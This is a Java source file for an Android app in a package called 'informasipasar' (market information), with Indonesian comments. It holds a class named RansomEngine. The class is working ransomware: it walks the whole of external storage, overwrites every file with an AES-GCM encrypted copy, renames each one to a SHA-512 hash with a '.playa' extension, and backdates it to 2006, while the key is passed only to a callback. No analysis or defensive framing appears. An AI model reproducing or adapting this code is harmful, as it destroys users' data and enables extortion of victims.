package com.informasipasar.app;

import android.os.Build;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class RansomEngine {

    private static final String TAG = "RansomEngine";
    private static final String EXT = ".playa";
    private static final int THREADS = 16;

    public interface Callback {
        void onDone(byte[] key);
    }

    public static byte[] generateKey() {
        byte[] k = new byte[16]; // AES-128
        new SecureRandom().nextBytes(k);
        return k;
    }

    public static String randomKeyString() {
        // Hash acak dari SHA-512 untuk key string
        try {
            byte[] seed = new byte[64];
            new SecureRandom().nextBytes(seed);
            MessageDigest md = MessageDigest.getInstance("SHA-512");
            byte[] d = md.digest(seed);
            StringBuilder sb = new StringBuilder();
            for (byte b : d) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) { return "tanaka"; }
    }

    public static List<File> collectFiles() {
        List<File> out = new ArrayList<>();
        File root = Environment.getExternalStorageDirectory();
        if (root != null) walk(root, out);
        return out;
    }

    private static void walk(File dir, List<File> out) {
        File[] fs = dir.listFiles();
        if (fs == null) return;
        for (File f : fs) {
            if (f.isDirectory()) {
                if (f.getName().startsWith(".")) continue;
                walk(f, out);
            } else {
                String n = f.getName();
                if (n.endsWith(EXT)) continue;
                if (n.startsWith(".")) continue;
                out.add(f);
            }
        }
    }

    public static void encryptAll(byte[] key, Callback cb) {
        List<File> files = collectFiles();
        ExecutorService pool = Executors.newFixedThreadPool(THREADS);
        for (File f : files) {
            pool.submit(() -> encryptFile(f, key));
        }
        pool.shutdown();
        try {
            pool.awaitTermination(10, TimeUnit.MINUTES);
        } catch (InterruptedException e) {
            Log.e(TAG, "Encrypt pool interrupted", e);
        }
        cb.onDone(key);
    }

    private static void encryptFile(File f, byte[] key) {
        try {
            byte[] plain = readAll(f);
            byte[] iv = new byte[12];
            new SecureRandom().nextBytes(iv);
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
            byte[] ct = c.doFinal(plain);
            // Output: IV(12) + ciphertext
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(iv);
            fos.write(ct);
            fos.close();

            // Rename: hash sha512 nama file + .playa
            String hash = sha512Hex(f.getName());
            File parent = f.getParentFile();
            File newName = new File(parent, hash + EXT);
            if (f.renameTo(newName)) {
                // Set tanggal file menjadi 06-06-2006
                setFileDate(newName);
            } else {
                setFileDate(f);
            }
        } catch (Exception e) {
            Log.e(TAG, "Encrypt failed: " + f.getAbsolutePath(), e);
        }
    }

    private static byte[] readAll(File f) throws IOException {
        FileInputStream fis = new FileInputStream(f);
        byte[] data = new byte[(int) f.length()];
        int read = 0;
        while (read < data.length) {
            int r = fis.read(data, read, data.length - read);
            if (r < 0) break;
            read += r;
        }
        fis.close();
        return data;
    }

    private static String sha512Hex(String s) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-512");
        byte[] d = md.digest(s.getBytes(StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        for (byte b : d) sb.append(String.format("%02x", b));
        return sb.toString();
    }

    private static void setFileDate(File f) {
        // 06-06-2006 -> epoch millis untuk 2006-06-06 00:00:00 UTC
        long ts = 1149552000000L;
        f.setLastModified(ts);
    }
}
